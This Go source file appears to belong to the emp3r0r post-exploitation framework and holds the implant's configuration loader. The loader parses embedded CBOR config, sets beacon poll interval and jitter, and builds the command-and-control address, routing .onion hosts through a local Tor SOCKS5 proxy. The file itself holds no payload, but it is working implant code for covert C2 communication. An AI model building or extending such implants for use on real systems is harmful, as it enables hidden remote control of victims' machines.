package common

import (
	"fmt"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var RuntimeConfig = &def.Config{}

func InitConfig() (err error) {
	configData, err := util.ExtractData()
	if err != nil {
		return fmt.Errorf("read config: %v", err)
	}

	// parse CBOR
	err = def.ReadCBORConfig(configData, RuntimeConfig)
	if err != nil {
		short_view := configData
		if len(configData) > 100 {
			short_view = configData[:100]
		}
		return fmt.Errorf("parsing %d bytes of CBOR data (%s...): %v", len(configData), short_view, err)
	}

	// Safe defaults
	if RuntimeConfig.PollInterval == 0 {
		RuntimeConfig.PollInterval = 60
	}
	if RuntimeConfig.Jitter == 0 {
		RuntimeConfig.Jitter = 20
	}

	// CC Address
	def.CCAddress = RuntimeConfig.CCAddress
	isTor := netutil.IsTor(def.CCAddress)
	if !isTor {
		// check if it is an onion address without scheme
		host := def.CCAddress
		if strings.Contains(host, ":") {
			host = strings.Split(host, ":")[0]
		}
		if strings.HasSuffix(host, ".onion") {
			isTor = true
		}
	}

	if isTor {
		// if scheme is missing, add http
		if !strings.HasPrefix(def.CCAddress, "http") {
			def.CCAddress = fmt.Sprintf("http://%s", def.CCAddress)
		}
		// if port is missing, add 80? No, Tor handles it.
		// ensure no trailing slash
		def.CCAddress = strings.TrimSuffix(def.CCAddress, "/")

		if RuntimeConfig.C2TransportProxy == "" {
			RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
		}
	} else if RuntimeConfig.UseKCP {
		RuntimeConfig.CCH2Port = RuntimeConfig.KCPClientPort
		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCH2Port)
	} else if RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
		def.CCAddress = fmt.Sprintf("http://%s:%s", def.CCAddress, RuntimeConfig.CCHTTPPort)
	} else {
		def.CCAddress = fmt.Sprintf("https://%s:%s", def.CCAddress, RuntimeConfig.CCH2Port)
	}

	// CA
	transport.CACrtPEM = []byte(RuntimeConfig.CAPEM)

	return err
}
